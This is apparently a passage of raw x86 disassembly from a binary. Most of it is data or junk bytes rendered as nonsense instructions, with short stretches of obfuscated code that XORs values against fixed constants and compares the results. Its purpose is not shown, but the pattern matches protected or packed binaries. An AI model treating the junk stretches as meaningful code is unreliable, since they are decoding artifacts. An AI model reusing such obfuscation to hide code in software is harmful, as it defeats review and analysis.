  405e07:	bound  ebx,QWORD PTR [ebx+ebx*4-0x36]
  405e0b:	loop   0x405e6b
  405e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e0e:	iret   
  405e0f:	test   BYTE PTR [ecx+0x27d17f20],0x2d
  405e16:	inc    edx
  405e17:	gs lock push edi
  405e1a:	ins    BYTE PTR es:[edi],dx
  405e1b:	hlt    
  405e1c:	xor    ebx,DWORD PTR [edx]
  405e1e:	int    0xb2
  405e20:	ss pusha 
  405e22:	aas    
  405e23:	popa   
  405e24:	push   cs
  405e25:	xchg   edi,eax
  405e26:	pusha  
  405e27:	in     eax,dx
  405e28:	ja     0x405dda
  405e2a:	sub    al,0xb4
  405e2c:	and    al,0x30
  405e2e:	or     DWORD PTR [ebx+ebx*2+0x2a52c9bb],edi
  405e35:	adc    dl,BYTE PTR [esi+ebx*1+0x448e4588]
  405e3c:	aaa    
  405e3d:	mov    ds:0xc8276fa8,eax
  405e42:	jne    0x405e1a
  405e44:	cmp    al,al
  405e46:	lods   al,BYTE PTR ds:[esi]
  405e47:	jns    0x405dce
  405e49:	xchg   esi,eax
  405e4a:	push   edx
  405e4b:	cli    
  405e4c:	in     eax,0xb5
  405e4e:	jae    0x405e27
  405e50:	inc    BYTE PTR [edx+0x52]
  405e53:	lods   eax,DWORD PTR ds:[esi]
  405e54:	mov    esp,0xed24300d
  405e59:	push   cs
  405e5a:	pop    eax
  405e5b:	jg     0x405de5
  405e5d:	cld    
  405e5e:	(bad)  
  405e5f:	xchg   edi,eax
  405e60:	mov    ecx,DWORD PTR [esi+0x4]
  405e63:	mov    ecx,eax
  405e65:	shl    ecx,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	(bad)  ds:[eax-0x412ea7b0]
  405e8c:	sub    eax,0xc4bdbebe
  405e91:	mov    esi,0x1f2eadbe
  405e96:	(bad)  [edi-0x29]
  405e99:	mov    edx,DWORD PTR [ebx]
  405e9b:	or     BYTE PTR [edx+0x1c182887],dl
  405ea1:	adc    eax,0x41
  405ea4:	push   0x863f95c3
  405ea9:	stc    
  405eaa:	(bad)  
  405eab:	sub    bl,BYTE PTR [ebp+0x3956bbd7]
  405eb1:	push   ebx
  405eb2:	and    dh,bl
  405eb4:	dec    eax
  405eb5:	mov    ebx,0x7584e18f
  405eba:	xchg   BYTE PTR [esi],bh
  405ebc:	add    BYTE PTR [edx-0x60],0x40
  405ec0:	or     al,0xd7
  405ec2:	sbb    bl,dh
  405ec4:	into   
  405ec5:	mov    ds:0xdde0c448,al
  405eca:	xchg   esi,eax
  405ecb:	push   cs
  405ecc:	jae    0x405e7d
  405ece:	inc    esp
  405ecf:	(bad)  
  405ed0:	shr    BYTE PTR [esi-0x6f],cl
  405ed3:	dec    edx
  405ed4:	mov    esp,0x7bba2e68
  405ed9:	push   es
  405eda:	push   esp
  405edb:	retf   0x63bd
  405ede:	mov    ss,edi
  405ee0:	jne    0x405ef5
  405ee2:	gs aad 0x54
  405ee5:	cmp    BYTE PTR [ecx+ecx*8-0x1],dl
  405ee9:	in     al,0x42
  405eeb:	adc    dh,BYTE PTR [edx-0xa1ef2ff]
  405ef1:	or     DWORD PTR [eax+0x3c],esp
  405ef4:	es dec eax
  405ef6:	mov    ds:0x28b735a6,al
  405efb:	inc    edi
  405efc:	mov    cl,0x52
  405efe:	pop    ecx
  405eff:	and    BYTE PTR [edx+eax*4+0x2a2159eb],dh
  405f06:	jl     0x405f0c
  405f08:	in     al,0x71
  405f0a:	into   
  405f0b:	adc    edi,DWORD PTR [esi+0x11]
  405f0e:	xchg   ecx,eax
  405f0f:	mov    al,ds:0xdb4450d8
  405f14:	add    BYTE PTR cs:[ebx+0x20],dh
  405f18:	in     al,dx
  405f19:	and    DWORD PTR [edi-0x30],ebp
  405f1c:	iret   
  405f1d:	icebp  
  405f1e:	push   cs
  405f1f:	gs cmp eax,0x28e2946d
  405f25:	call   0x5d38fc0d
  405f2a:	les    edx,FWORD PTR [edx+0xda813c8]
  405f30:	fcomip st,st(5)
  405f32:	jmp    0x405f75
  405f34:	jp     0x405f38
  405f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f37:	pop    es
  405f38:	push   ss
  405f39:	or     BYTE PTR ds:0xd0962e7c,bl
  405f3f:	xchg   DWORD PTR [eax-0x1739fcd4],edi
  405f45:	into   
  405f46:	add    eax,0x819bdd3b
  405f4b:	stc    
  405f4c:	inc    edi
  405f4d:	les    eax,FWORD PTR [ebx]
  405f4f:	(bad)  
  405f50:	sbb    ebp,DWORD PTR [ecx+0x1d10ca2e]
  405f56:	hlt    
  405f57:	ja     0x405f24
  405f59:	in     eax,0xc0
  405f5b:	xor    ecx,DWORD PTR [ebx]
  405f5d:	push   edi
  405f5e:	iretw  
  405f60:	in     al,0x4d
  405f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f63:	xchg   ebx,eax
  405f64:	lods   eax,DWORD PTR ds:[esi]
  405f65:	mov    esp,0x6877d27d
  405f6a:	fistp  WORD PTR [edi]
  405f6c:	retf   0xbb0b
  405f6f:	adc    ebx,DWORD PTR [edx-0x7a]
  405f72:	loop   0x405fcb
  405f74:	mov    bh,0xee
  405f76:	pop    esp
  405f77:	add    eax,0x867aecaa
  405f7c:	dec    esp
  405f7d:	fisubr WORD PTR [esi-0x1c]
  405f80:	jecxz  0x405f83
  405f82:	nop
  405f83:	jmp    0x3c3a:0x90ff40d9
  405f8a:	aam    0x46
  405f8c:	(bad)  
  405f8e:	sub    al,0xba
  405f90:	mov    al,ds:0x2936dd4a
  405f95:	rol    al,0xf2
  405f98:	adc    BYTE PTR [esi+0x1e],ch
  405f9b:	pop    edx
  405f9c:	test   BYTE PTR [esi],dl
  405f9e:	mov    al,ds:0xdbb92ce2
  405fa3:	push   cs
  405fa4:	popa   
  405fa5:	(bad)  
  405fa6:	xor    BYTE PTR [edi-0x26],cl
  405fa9:	push   ebp
  405faa:	mov    ?,WORD PTR [ebx-0x22c339fa]
  405fb0:	push   cs
  405fb1:	pop    edi
  405fb2:	shl    BYTE PTR [eax-0x78a5f5b4],cl
  405fb8:	adc    DWORD PTR [ebx+ebx*1],edi
  405fbb:	stos   BYTE PTR es:[edi],al
  405fbc:	jle    0x405f55
  405fbe:	call   0xcf8d02e6
  405fc3:	mov    DWORD PTR ds:0xaa0be1,edi
  405fc9:	dec    ecx
  405fca:	xchg   ebp,eax
  405fcb:	lods   eax,DWORD PTR ds:[esi]
  405fcc:	das    
  405fcd:	mov    al,ds:0x68e37d6f
  405fd2:	pop    edi
  405fd3:	mov    esp,0xf9279089
  405fd8:	xchg   edi,eax
  405fd9:	cmc    
  405fda:	inc    esi
  405fdb:	out    dx,al
  405fdc:	mov    dl,0x79
  405fde:	push   ebp
  405fdf:	dec    eax
  405fe0:	int3   
  405fe1:	and    DWORD PTR [ebx+0x14],esi
  405fe4:	xchg   edi,eax
  405fe5:	adc    al,0xe5
  405fe7:	and    esp,edx
  405fe9:	sbb    BYTE PTR [ebx-0x502be715],bl
  405fef:	aam    0x2f
  405ff1:	mov    ah,0x1e
  405ff3:	mov    edx,0x6231c767
  405ff8:	verr   WORD PTR [eax+0x46]
  405ffc:	xchg   ecx,eax
  405ffd:	mov    ebp,0xcd9fbcfb
  406002:	sbb    eax,0xc635be3b
  406007:	in     eax,dx
  406008:	add    DWORD PTR [ebp+eiz*2-0x4abddbb8],edx
  40600f:	dec    BYTE PTR [ebx]
  406011:	(bad)  
  406012:	mov    esp,0x27bd9f8a
  406017:	fbld   TBYTE PTR [ebp-0x182d6d53]
  40601d:	std    
  40601e:	jecxz  0x406095
  406020:	xlat   BYTE PTR ds:[ebx]
  406021:	scas   eax,DWORD PTR es:[edi]
  406022:	adc    bl,dh
  406024:	sti    
  406025:	dec    edi
  406026:	mov    ecx,0x609df56e
  40602b:	ror    DWORD PTR [ebx+0x7bc9efc1],cl
  406031:	jp     0x40600f
  406033:	jns    0x405fef
  406035:	mov    WORD PTR [ebx+0x48],?
  406038:	nop
  406039:	mov    cl,0xb8
  40603b:	push   ds
  40603c:	lods   al,BYTE PTR ds:[esi]
  40603d:	adc    BYTE PTR [ecx-0x31],0x60
  406041:	dec    esi
  406042:	jae    0x406035
  406044:	add    DWORD PTR [ebx],esi
  406046:	mov    ds:0xec207109,eax
  40604b:	repnz pop es
  40604d:	push   ss
  40604e:	push   esp
  40604f:	sbb    ah,ch
  406051:	loopne 0x406077
  406053:	jecxz  0x40602a
  406055:	mov    bl,0x1f
  406057:	and    DWORD PTR [ecx-0x71],ebx
  40605a:	pop    ebx
  40605b:	jmp    FWORD PTR [ebx+0x2a]
  40605e:	repz adc edi,DWORD PTR [eax]
  406061:	mov    al,0x3a
  406063:	jo     0x405feb
  406065:	imul   edi,DWORD PTR [edx],0xffffffb1
  406068:	xchg   edi,eax
  406069:	rsqrtps xmm6,XMMWORD PTR [eax+0x9929b41]
  406070:	test   eax,0xf9e0b05
  406075:	fiadd  DWORD PTR [edi]
  406077:	xchg   edi,eax
  406078:	(bad)  
  40607a:	mov    ebp,?
  40607c:	xchg   esi,eax
  40607d:	sti    
  40607e:	fstp   st(2)
  406080:	or     al,0x8e
  406082:	call   0x7373a569
  406087:	jnp    0x406062
  406089:	popf   
  40608a:	push   eax
  40608b:	lock and esp,DWORD PTR [ebp-0x5c]
  40608f:	jae    0x4060ff
  406091:	iret   
  406092:	or     DWORD PTR [ebx-0x79],edx
  406095:	push   es
  406096:	jp     0x4060d2
  406098:	sub    esi,DWORD PTR [ebx-0x4b]
  40609b:	cli    
  40609c:	xor    ebp,DWORD PTR [eax+0x60555177]
  4060a2:	mov    esi,0x8026544b
  4060a7:	push   ds
  4060a8:	mov    bl,0xda
  4060aa:	sub    bh,dh
  4060ac:	sahf   
  4060ad:	mov    ah,BYTE PTR [edi+0x44]
  4060b0:	inc    esi
  4060b1:	mov    bl,BYTE PTR [edi]
  4060b3:	outs   dx,BYTE PTR ds:[esi]
  4060b4:	mov    ds:0x3c62e790,eax
  4060b9:	or     al,0xe7
  4060bb:	xlat   BYTE PTR ds:[ebx]
  4060bc:	neg    BYTE PTR [eax]
  4060be:	push   ecx
  4060bf:	fld    DWORD PTR [eax+0x23]
  4060c2:	mov    ds:0xeaf8349c,eax
  4060c7:	ins    BYTE PTR es:[edi],dx
  4060c8:	push   eax
  4060c9:	xchg   DWORD PTR [ebp-0x3c],esi
  4060cc:	mov    bl,0x47
  4060ce:	adc    ebp,DWORD PTR [ebx]
  4060d0:	aas    
  4060d1:	stos   DWORD PTR es:[edi],eax
  4060d2:	adc    ch,cl
  4060d4:	mov    BYTE PTR [ecx-0x12],dl
  4060d7:	add    esi,esp
  4060d9:	mov    bh,0x12
  4060db:	xor    eax,0xbcbf92ab
  4060e0:	in     al,0x96
  4060e2:	and    al,0x1a
  4060e4:	int    0x9b
  4060e6:	ror    BYTE PTR [esi+0x57],0x92
  4060ea:	out    0x99,al
  4060ec:	xor    BYTE PTR [ebx],cl
  4060ee:	mov    ebx,0x90404eee
  4060f3:	inc    ebx
  4060f4:	(bad)  
  4060f6:	mov    bh,0x83
  4060f8:	sbb    ah,al
  4060fa:	retf   0xa365
  4060fd:	mov    esp,0xcc97a3ae
  406102:	data16 mov cl,0xab
  406105:	sbb    BYTE PTR [esi],dl
  406107:	jp     0x40610b
  406109:	mov    DWORD PTR [ecx],ecx
  40610b:	scas   al,BYTE PTR es:[edi]
  40610c:	jbe    0x4060a9
  40610e:	inc    edi
  40610f:	rdpmc  
  406111:	ins    DWORD PTR es:[edi],dx
  406112:	out    0xfc,eax
  406114:	cmc    
  406115:	fld    QWORD PTR [ebp+0xe]
  406118:	mov    edx,0xc1d913b6
  40611d:	imul   DWORD PTR [esi+0xb]
  406120:	mov    ds:0x2a51145c,eax
  406125:	stos   BYTE PTR es:[edi],al
  406126:	or     bl,BYTE PTR [eax+ebp*2-0x764898de]
  40612d:	jb     0x40616e
  40612f:	out    0x4e,eax
  406131:	ins    BYTE PTR es:[edi],dx
  406132:	cs push 0xb2e9b6f3
  406138:	and    al,0xe7
  40613a:	dec    esi
  40613b:	in     eax,0x31
  40613d:	pop    esp
  40613e:	je     0x406196
  406140:	cdq    
  406141:	in     eax,0x5
  406143:	and    DWORD PTR [eax],edi
  406145:	mov    esp,ss
  406147:	inc    ebp
  406148:	dec    ecx
  406149:	sub    ah,bl
  40614b:	add    ebp,esi
  40614d:	push   ds
  40614e:	inc    esi
  40614f:	add    eax,0xf850de9c
  406154:	pop    esp
  406155:	outs   dx,DWORD PTR ds:[esi]
  406156:	pop    eax
  406157:	sub    DWORD PTR [ecx+0x15facc44],esi
  40615d:	mov    cl,0xd0
  40615f:	push   es
  406160:	jge    0x4060fb
  406162:	fadd   DWORD PTR [esi+ebx*4-0x4efa6345]
  406169:	or     al,0x5f
  40616b:	or     cl,al
  40616d:	je     0x40610d
  40616f:	loopne 0x406167
  406171:	enter  0x41ce,0x18
  406175:	jmp    0xae94d032
  40617a:	mov    ds:0x3be54458,eax
  40617f:	xchg   ebx,eax
  406180:	adc    eax,0x73f22a9c
  406185:	test   al,0xf3
  406187:	inc    edx
  406188:	mov    ?,WORD PTR [edi+0x6a075596]
  40618e:	(bad)  
  406190:	or     eax,ebx
  406192:	xor    DWORD PTR [ecx],0xffffffcc
  406195:	nop
  406196:	sbb    eax,0x40f30b98
  40619b:	pop    DWORD PTR [esi]
  40619d:	xor    DWORD PTR [eax],ecx
  40619f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a0:	sti    
  4061a1:	push   ebx
  4061a2:	lods   al,BYTE PTR ds:[esi]
  4061a3:	cmp    esp,DWORD PTR [esi-0xc7bf16e]
  4061a9:	imul   eax,DWORD PTR [ebx],0x38
  4061ac:	pop    ss
  4061ad:	push   0x27efa9bc
  4061b2:	jge    0x4061b2
  4061b4:	cmp    DWORD PTR [ebp+0xeba8cdd],eax
  4061ba:	inc    esp
  4061bb:	mov    ebx,0xee827b4d
  4061c0:	jp     0x406221
  4061c2:	call   0xcd12:0x10fda92
  4061c9:	mov    ebp,0x794f9c3
  4061ce:	mov    ds:0x10089dfc,al
  4061d3:	push   0x44f3a170
  4061d8:	xchg   edi,eax
  4061d9:	xchg   esp,eax
  4061da:	aam    0xf1
  4061dc:	in     al,dx
  4061dd:	cwde   
  4061de:	js     0x4061b3
  4061e0:	jb     0x4061fd
  4061e2:	pop    edx
  4061e3:	pmulhuw mm4,mm1
  4061e6:	jns    0x406182
  4061e8:	out    dx,al
  4061e9:	and    eax,DWORD PTR [ecx-0x4bc2da04]
  4061ef:	fldcw  WORD PTR [eax+eiz*4+0x59]
  4061f3:	mov    esp,0xbfdccd7b
  4061f8:	push   edx
  4061f9:	mov    bh,0xda
  4061fb:	mov    BYTE PTR [edi+ecx*4-0x43],al
  4061ff:	and    BYTE PTR [ecx+0x75],bl
  406202:	adc    eax,0x2786009e
  406207:	xchg   edx,eax
  406208:	(bad)  
  406209:	into   
  40620a:	push   edi
  40620b:	stos   BYTE PTR es:[edi],al
  40620c:	cwde   
  40620d:	dec    esp
  40620e:	bnd ret 0x70bc
  406212:	mov    ebx,0x41e0db9e
  406217:	xor    edx,0x9c2b8ae8
  40621d:	xor    ecx,0xcb79b577
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	fisubr DWORD PTR [esi+0x4e]
  4062eb:	sahf   
  4062ec:	mov    ebp,0xbdbebe33
  4062f1:	les    edi,FWORD PTR [esi+0x7bce7be]
  4062f7:	mov    DWORD PTR [edi+0x472b9c89],eax
  4062fd:	imul   esi,ebx,0xffffff92
  406300:	mov    bl,0xf2
  406302:	push   esi
  406303:	std    
  406304:	fdivr  QWORD PTR [edi+0x7e]
  406307:	mov    edi,DWORD PTR [esi]
  406309:	inc    eax
  40630a:	fbld   TBYTE PTR [ebp+0x36041ff3]
  406310:	out    dx,eax
  406311:	leave  
  406312:	les    esi,FWORD PTR fs:[eax]
  406315:	lods   eax,DWORD PTR ds:[esi]
  406316:	aaa    
  406317:	outs   dx,DWORD PTR ds:[esi]
  406318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406319:	retf   
  40631a:	cli    
  40631b:	cwde   
  40631c:	lods   eax,DWORD PTR ds:[esi]
  40631d:	gs sahf 
  40631f:	xlat   BYTE PTR ds:[ebx]
  406320:	inc    esp
  406321:	jns    0x406377
  406323:	push   ebx
  406324:	push   ecx
  406325:	mov    ds:0xa9c4e461,al
  40632a:	push   esp
  40632b:	dec    edx
  40632c:	fistp  QWORD PTR [ebx+0x52]
  40632f:	gs inc edi
  406331:	push   cs
  406332:	fiadd  DWORD PTR [eax]
  406334:	pop    esp
  406335:	lods   al,BYTE PTR ds:[esi]
  406336:	aam    0x78
  406338:	jae    0x4062f7
  40633a:	sar    BYTE PTR [edx-0x2f],1
  40633d:	mov    ds,edx
  40633f:	js     0x40633f
  406341:	and    al,0xbb
  406343:	outs   dx,DWORD PTR ds:[esi]
  406344:	mov    ds:0xeb3b255a,al
  406349:	test   eax,0x1545a398
  40634e:	jp     0x406308
  406350:	jo     0x40639c
  406352:	ds pushf 
  406354:	jmp    0x9ee5:0xb23b406b
  40635b:	fstp   TBYTE PTR [eax+0x2d69c898]
  406361:	(bad)  
  406362:	in     al,0x7c
  406364:	loope  0x406336
  406366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406367:	es push edx
  406369:	dec    esi
  40636a:	mov    ecx,edx
  40636c:	mov    ds,WORD PTR [edx-0x7a6f8989]
  406372:	jmp    0x3cfc:0x2536f2e6
  406379:	mov    edx,0x3d6ba1b3
  40637e:	push   cs
  40637f:	fmul   st(2),st
  406381:	call   0x2dfeea6
  406386:	pop    ecx
  406387:	stc    
  406388:	lds    esp,FWORD PTR ds:0x73fd5da
  40638e:	cmp    BYTE PTR [edi+eax*1+0x75],ch
  406392:	and    DWORD PTR [esi+0x15],ebx
  406395:	js     0x4063a7
  406397:	pop    ss
  406398:	scas   al,BYTE PTR es:[edi]
  406399:	test   al,0x96
  40639b:	push   ecx
  40639c:	mov    bh,0x5a
  40639e:	cmovle esp,DWORD PTR [edx+0x7f]
  4063a2:	push   ebx
  4063a3:	or     si,WORD PTR [edi-0x1a]
  4063a7:	ret    0xd98e
  4063aa:	lahf   
  4063ab:	pop    eax
  4063ac:	jl     0x406342
  4063ae:	cwde   
  4063af:	das    
  4063b0:	jecxz  0x406382
  4063b2:	clc    
  4063b3:	mov    dh,0x58
  4063b5:	sbb    ecx,eax
  4063b7:	add    BYTE PTR [ebp+0x24823ddc],cl
  4063bd:	aas    
  4063be:	cmp    BYTE PTR [ecx+0x79],ah
  4063c1:	sub    al,0x2b
  4063c3:	lods   eax,DWORD PTR ds:[esi]
  4063c4:	pop    es
  4063c5:	inc    edx
  4063c6:	jecxz  0x4063a9
  4063c8:	lahf   
  4063c9:	sbb    DWORD PTR [eax+eiz*4],0xdfba0541
  4063d0:	daa    
  4063d1:	jecxz  0x406388
  4063d3:	fild   QWORD PTR [edi-0x12]
  4063d6:	xchg   esi,eax
  4063d7:	push   es
  4063d8:	jnp    0x4063f1
  4063da:	jge    0x4063b1
  4063dc:	xchg   edx,eax
  4063dd:	ja     0x40636a
  4063df:	daa    
  4063e0:	out    dx,al
  4063e1:	cld    
  4063e2:	leave  
  4063e3:	popa   
  4063e4:	push   eax
  4063e5:	in     eax,dx
  4063e6:	lock int3 
  4063e8:	cs dec ebx
  4063ea:	pop    esp
  4063eb:	stc    
  4063ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063ed:	retf   0xead2
  4063f0:	or     BYTE PTR [ebx+0x7d61ff21],dh
  4063f6:	ja     0x406424
  4063f8:	mov    dl,0xfb
  4063fa:	ins    DWORD PTR es:[edi],dx
  4063fb:	dec    ebp
  4063fc:	int3   
  4063fd:	sub    BYTE PTR [eax+0x13],bh
  406400:	cs in  eax,0x20
  406403:	xor    cl,BYTE PTR [edx-0x1]
  406406:	cmp    al,0x6
  406408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406409:	stos   DWORD PTR es:[edi],eax
  40640a:	je     0x406473
  40640c:	loope  0x4063fc
  40640e:	xor    edi,DWORD PTR [edi+0x76724a9e]
  406414:	fld    DWORD PTR [ecx+ecx*1-0x40]
  406418:	nop
  406419:	cmp    al,0x35
  40641b:	pushf  
  40641c:	in     eax,dx
  40641d:	adc    eax,DWORD PTR [ecx+0xe]
  406420:	add    DWORD PTR [edi-0x50ce9573],esp
  406426:	mov    edx,0xadd9df78
  40642b:	mov    eax,0x5c2b656c
  406430:	mov    ?,WORD PTR [eax-0x12c108ea]
  406436:	pop    ss
  406437:	aad    0x52
  406439:	or     ecx,esp
  40643b:	psrld  mm6,QWORD PTR [edi]
  40643e:	xor    DWORD PTR [esp+ebx*1],ecx
  406441:	sbb    BYTE PTR [ebx-0x1845237c],bl
  406447:	jns    0xc78f611c
  40644d:	mov    dh,0x43
  40644f:	pop    esp
  406450:	outs   dx,BYTE PTR ds:[esi]
  406451:	in     eax,dx
  406452:	adc    esp,DWORD PTR [ebx-0x77f8733c]
  406458:	repz push 0x941b8a3d
  40645e:	jo     0x406402
  406460:	mov    edx,DWORD PTR [ecx+0x78]
  406463:	xchg   esi,eax
  406464:	mov    ch,0x61
  406466:	lahf   
  406467:	loop   0x406421
  406469:	or     edi,DWORD PTR [esi-0x5b]
  40646c:	add    eax,0x2338ee77
  406471:	test   BYTE PTR [edi+0x1f],0x66
  406475:	inc    edx
  406476:	mov    dl,0x5
  406478:	std    
  406479:	or     esp,DWORD PTR [eax-0x65]
  40647c:	cdq    
  40647d:	lock lds edi,FWORD PTR [ecx-0x4e]
  406481:	cdq    
  406482:	or     DWORD PTR [edi],edx
  406484:	mov    al,ds:0xba812ac2
  406489:	(bad)  
  40648a:	or     DWORD PTR [ebp-0x5b],eax
  40648d:	stos   BYTE PTR es:[edi],al
  40648e:	test   DWORD PTR [eax],ecx
  406490:	mov    WORD PTR [edi],?
  406492:	lock (bad) 
  406494:	ret    
  406495:	clc    
  406496:	pop    ebp
  406497:	cmp    BYTE PTR [edx],al
  406499:	mov    eax,DWORD PTR [edi+edi*4-0xc]
  40649d:	pop    ebx
  40649e:	xchg   ebp,eax
  40649f:	jmp    0x4064f4
  4064a1:	xor    DWORD PTR [eax+esi*2],esi
  4064a4:	repnz (bad) 
  4064a6:	fisub  DWORD PTR [ebp-0x7682771c]
  4064ac:	jno    0x406441
  4064ae:	sbb    ebx,DWORD PTR [esi+0x78]
  4064b1:	aaa    
  4064b2:	cmp    al,BYTE PTR [ebx+0x41]
  4064b5:	fwait
  4064b6:	and    al,0x8d
  4064b8:	arpl   cx,cx
  4064ba:	sbb    DWORD PTR [edi+0x7da5adbb],eax
  4064c0:	push   esi
  4064c1:	mov    ?,WORD PTR [eax-0x7efcbbc7]
  4064c7:	jmp    FWORD PTR [ecx-0x42]
  4064ca:	mov    BYTE PTR [ebp+0x3c2ea788],dh
  4064d0:	push   ebx
  4064d1:	dec    eax
  4064d2:	ja     0x406540
  4064d4:	in     al,0xe5
  4064d6:	inc    edi
  4064d7:	pop    ecx
  4064d8:	test   al,0xa6
  4064da:	lods   al,BYTE PTR fs:[esi]
  4064dc:	mov    dh,0x31
  4064de:	jne    0x406535
  4064e0:	(bad)  
  4064e1:	cmp    DWORD PTR [ecx],0x13
  4064e4:	shr    DWORD PTR [eax-0x5d],cl
  4064e7:	cwde   
  4064e8:	xchg   DWORD PTR [eax],edx
  4064ea:	retf   
  4064eb:	fld    TBYTE PTR [ebx]
  4064ed:	iret   
  4064ee:	shr    BYTE PTR [esi+0x50efc65d],1
  4064f4:	(bad)  
  4064f5:	rcr    BYTE PTR [esi],cl
  4064f7:	lods   eax,DWORD PTR ds:[esi]
  4064f8:	and    bl,BYTE PTR [eax+edx*8]
  4064fb:	pop    ecx
  4064fc:	adc    al,0x70
  4064fe:	jmp    0x5fc2:0x4eab8d29
  406505:	jge    0x406558
  406507:	enter  0xc254,0x40
  40650b:	mov    al,ds:0x5ba397e7
  406510:	lods   eax,DWORD PTR cs:[esi]
  406512:	fnstcw WORD PTR [esi-0x77]
  406515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406516:	mov    cl,0x3c
  406518:	mov    ds:0xb695c6ed,al
  40651d:	dec    ebp
  40651e:	xchg   edi,eax
  40651f:	js     0x406582
  406521:	das    
  406522:	jb     0x40657f
  406524:	stc    
  406525:	or     ch,BYTE PTR [ebx-0xb]
  406528:	dec    edi
  406529:	inc    ebx
  40652a:	fld    TBYTE PTR [ebx+0xe6105b9]
  406530:	and    BYTE PTR [eax+0x7df0a1b1],ch
  406536:	xchg   ebx,eax
  406537:	fsubr  QWORD PTR ds:0x19b0b7fd
  40653d:	imul   edi,DWORD PTR [ebx+eax*4+0x1a1aa8ef],0x5f65d6c4
  406548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406549:	je     0x406556
  40654b:	retf   
  40654c:	fcmovnu st,st(2)
  40654e:	mov    eax,0x44bc7e63
  406553:	sti    
  406554:	clc    
  406555:	icebp  
  406556:	sbb    DWORD PTR [edi],ebx
  406558:	std    
  406559:	sbb    BYTE PTR [edx],0x4f
  40655c:	jl     0x406521
  40655e:	test   eax,0xc6f4c3c7
  406563:	mov    al,0x3a
  406565:	div    DWORD PTR [eax-0x47]
  406568:	fdivr  QWORD PTR [esi+0xa]
  40656b:	push   esp
  40656c:	cmp    DWORD PTR [bx+si+0x1d53],esp
  406571:	pop    esi
  406572:	cmp    ch,BYTE PTR [edi]
  406574:	call   FWORD PTR [ebx-0x72]
  406577:	push   ebx
  406578:	jge    0x406558
  40657a:	scas   eax,DWORD PTR es:[edi]
  40657b:	lods   eax,DWORD PTR ds:[esi]
  40657c:	xor    edi,DWORD PTR [ebx+esi*2]
  40657f:	adc    eax,0x6121d1a
  406584:	mov    ch,0xce
  406586:	cli    
  406587:	daa    
  406588:	mov    edi,DWORD PTR [ecx+0x52ee1e5f]
  40658e:	lock dec ebx
  406590:	loopne 0x406516
  406592:	loopne 0x4065ba
  406594:	lea    ecx,[edx+ebx*1]
  406597:	call   0xd3f3:0x5c59df84
  40659e:	dec    esi
  40659f:	push   cs
  4065a0:	ficomp DWORD PTR [esi-0x2a]
  4065a3:	imul   esp,ebp,0xffffffeb
  4065a6:	adc    al,0xfd
  4065a8:	addr16 stc 
  4065aa:	add    DWORD PTR [ebp+0x46962c15],edx
  4065b0:	imul   edi,DWORD PTR [ecx],0x79
  4065b3:	loope  0x406624
  4065b5:	add    eax,0xc078a19a
  4065ba:	mov    fs,WORD PTR [ebx]
  4065bc:	pop    ss
  4065bd:	inc    ebx
  4065be:	popa   
